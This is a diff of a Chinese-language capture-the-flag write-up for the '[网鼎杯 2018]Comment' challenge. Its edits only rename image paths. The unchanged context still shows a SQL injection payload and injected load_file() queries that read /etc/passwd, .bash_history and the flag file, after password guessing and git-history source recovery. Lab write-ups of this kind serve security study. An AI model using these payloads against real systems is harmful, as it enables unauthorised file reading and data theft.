@@ -14,7 +14,7 @@
 
 首页给了一个留言版发帖，但是点击发帖输入提交后发现要求登录
 
-![](./img/[网鼎杯 2018]Comment-1.png)
+![](./img/[网鼎杯2018]Comment-1.png)
 
 提示账号为`zhangwei`，密码为`zhangwei***`，先尝试`纯数字`
 
@@ -77,7 +77,7 @@ else{
 git log --all
 ```
 
-![](./img/[网鼎杯 2018]Comment-22.png)
+![](./img/[网鼎杯2018]Comment-22.png)
 
 发现了三个版本，逐个回退，在`e5b2a2443c2b6d395d06960123142bc91123148c`版本发现源码
 
@@ -137,15 +137,15 @@ title=test&category=test',content=database(),/*&content=test
 
 发现能正常回显
 
-![](./img/[网鼎杯 2018]Comment-4.png)
+![](./img/[网鼎杯2018]Comment-4.png)
 
 因为`sql`语句是多行语句，所以用`*/`进行多行注释
 
-![](./img/[网鼎杯 2018]Comment-5.png)
+![](./img/[网鼎杯2018]Comment-5.png)
 
 
 
-![](./img/[网鼎杯 2018]Comment-3.png)
+![](./img/[网鼎杯2018]Comment-3.png)
 
 发现能正常查询，注`数据库，表等等`
 
@@ -161,7 +161,7 @@ title=test&category=test',content=database(),/*&content=test
 (select(load_file("/etc/passwd")))
 ```
 
-![](./img/[网鼎杯 2018]Comment-6.png)
+![](./img/[网鼎杯2018]Comment-6.png)
 
 发现家目录在`/home/www`，尝试读取`.bash_history`
 
@@ -169,7 +169,7 @@ title=test&category=test',content=database(),/*&content=test
 (select(load_file("/home/www/.bash_history")))
 ```
 
-![](./img/[网鼎杯 2018]Comment-7.png)
+![](./img/[网鼎杯2018]Comment-7.png)
 
 发现`.DS_Store`文件还在`/tmp/html`，`.DS_Store`文件可以看到目录文件，尝试读取
 
@@ -177,7 +177,7 @@ title=test&category=test',content=database(),/*&content=test
 (select(load_file("/tmp/html/.DS_Store")))
 ```
 
-![](./img/[网鼎杯 2018]Comment-8.png)
+![](./img/[网鼎杯2018]Comment-8.png)
 
 这样读有点问题，尝试使用`16`进制输出
 
@@ -185,11 +185,11 @@ title=test&category=test',content=database(),/*&content=test
 (select(hex(load_file("/tmp/html/.DS_Store"))))
 ```
 
-![](./img/[网鼎杯 2018]Comment-9.png)
+![](./img/[网鼎杯2018]Comment-9.png)
 
 `hex`解码
 
-![](./img/[网鼎杯 2018]Comment-10.png)
+![](./img/[网鼎杯2018]Comment-10.png)
 
 读取文件
 
@@ -197,8 +197,8 @@ title=test&category=test',content=database(),/*&content=test
 (select(hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))))
 ```
 
-![](./img/[网鼎杯 2018]Comment-11.png)
+![](./img/[网鼎杯2018]Comment-11.png)
 
-![](./img/[网鼎杯 2018]Comment-12.png)
+![](./img/[网鼎杯2018]Comment-12.png)
 
 [参考文章](https://www.cnblogs.com/Article-kelp/p/16077919.html)
